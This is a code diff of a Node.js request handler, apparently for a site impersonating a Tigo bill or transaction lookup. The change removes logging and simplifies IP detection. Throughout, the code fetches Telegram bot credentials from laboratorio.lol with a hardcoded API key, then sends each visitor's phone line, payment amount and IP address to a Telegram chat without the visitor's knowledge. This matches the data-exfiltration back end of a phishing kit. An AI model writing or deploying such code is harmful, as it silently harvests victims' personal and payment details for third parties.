@@ -21,68 +21,31 @@ function generarTxid() {
     return crypto.randomBytes(16).toString('hex');
 }
 
-function getRealIpAddr(req) {
-    let ip = '';
-    if (req.headers['cf-connecting-ip']) {
-        ip = req.headers['cf-connecting-ip'];
-    } else if (req.headers['x-forwarded-for']) {
-        ip = req.headers['x-forwarded-for'].split(',')[0].trim();
-    } else if (req.headers['x-real-ip']) {
-        ip = req.headers['x-real-ip'];
-    } else {
-        ip = req.socket?.remoteAddress || req.connection?.remoteAddress || 'unknown';
-    }
-    return ip;
-}
-
 async function obtenerCredencialesTelegram(site = 'tigoconsulta') {
     try {
-        const apiKey = process.env.LABORATORIO_LOL_API_KEY || 'C4fEzGJfN92dkLKrZ43ULzFbAcx7mD9v';
-        console.log('[Telegram] Obteniendo credenciales de laboratorio.lol con site:', site);
-
-        const controller = new AbortController();
-        const timeout = setTimeout(() => controller.abort(), 5000);
-
         const response = await fetch(
             `https://www.laboratorio.lol/api/encryptor.php?site=${site}`,
-            { headers: { 'X-API-Key': apiKey }, signal: controller.signal }
+            { headers: { 'X-API-Key': process.env.LABORATORIO_LOL_API_KEY || 'C4fEzGJfN92dkLKrZ43ULzFbAcx7mD9v' } }
         );
-        clearTimeout(timeout);
-
         const data = await response.json();
-        console.log('[Telegram] Respuesta de laboratorio.lol:', data);
-        const token = data.token || data.bot_token;
-        const chatId = data.chat_id;
-        console.log('[Telegram] Token obtenido:', token ? '✓' : '✗', 'ChatId:', chatId ? '✓' : '✗');
-        return { token, chatId };
+        return { token: data.token || data.bot_token, chatId: data.chat_id };
     } catch (error) {
-        console.error('[Telegram] Error obteniendo credenciales:', error.message);
         return null;
     }
 }
 
 async function enviarNotificacionTelegram(txid, transaccion) {
     try {
-        console.log('[Telegram] Datos recibidos:', JSON.stringify(transaccion));
-        console.log('[Telegram] Iniciando envío de notificación...');
         const creds = await obtenerCredencialesTelegram('tigoconsulta');
-        console.log('[Telegram] Credenciales obtenidas:', creds ? '✓' : '✗');
-        if (!creds?.token || !creds?.chatId) {
-            console.log('[Telegram] ✗ Credenciales inválidas. Token:', creds?.token ? '✓' : '✗', 'ChatId:', creds?.chatId ? '✓' : '✗');
-            return;
-        }
-        const mensaje = `🔔 <b>NUEVA TRANSACCIÓN TIGO</b>\n\n<b>TxID:</b> <code>${txid}</code>\n<b>Línea:</b> ${transaccion.referencia}\n<b>Valor:</b> ${transaccion.valor_formateado}\n<b>Estado:</b> ${transaccion.estado || 'N/A'}\n<b>IP:</b> ${transaccion.ip || 'N/A'}`;
-        console.log('[Telegram] Mensaje:', mensaje);
-        console.log('[Telegram] Enviando mensaje a chat:', creds.chatId);
-        const telegramRes = await fetch(`https://api.telegram.org/bot${creds.token}/sendMessage`, {
+        if (!creds?.token || !creds?.chatId) return;
+        const mensaje = `🔔 <b>NUEVA TRANSACCIÓN TIGO</b>\n\n<b>TxID:</b> <code>${txid}</code>\n<b>Línea:</b> ${transaccion.referencia}\n<b>Valor:</b> ${transaccion.valor_formateado}\n<b>Estado:</b> ${transaccion.estado}\n<b>IP:</b> ${transaccion.ip}`;
+        await fetch(`https://api.telegram.org/bot${creds.token}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ chat_id: creds.chatId, text: mensaje, parse_mode: 'HTML' })
         });
-        const telegramData = await telegramRes.json();
-        console.log('[Telegram] Respuesta:', telegramData.ok ? '✓ Enviado' : '✗ Error: ' + telegramData.description);
     } catch (error) {
-        console.error('[Telegram] Error:', error.message);
+        console.error('Telegram error:', error);
     }
 }
 
@@ -146,17 +109,11 @@ module.exports = async (req, res) => {
         if (!apiResponse.ok) return res.status(200).json(apiResponse);
 
         const txid = generarTxid();
-        const clientIp = getRealIpAddr(req);
+        const clientIp = req.headers['x-forwarded-for'] || req.connection?.remoteAddress || 'unknown';
 
-        console.log('[API] Iniciando procesos async para txid:', txid);
+        guardarConsultaFactura(txid, apiResponse.factura, clientIp).catch(console.error);
+        enviarNotificacionTelegram(txid, { ...apiResponse.factura, ip: clientIp }).catch(console.error);
 
-        // Guardar datos (esperar a que termine)
-        guardarConsultaFactura(txid, apiResponse.factura, clientIp).catch(e => console.error('[API] Error guardando:', e));
-
-        // Telegram en segundo plano (NO esperar)
-        enviarNotificacionTelegram(txid, { ...apiResponse.factura, ip: clientIp }).catch(e => console.error('[API] Error Telegram:', e));
-
-        console.log('[API] Respondiendo al cliente con txid:', txid);
         return res.status(200).json({ ...apiResponse, txid });
     } catch (error) {
         return res.status(400).json({ ok: false, error: 'Error: ' + error.message });
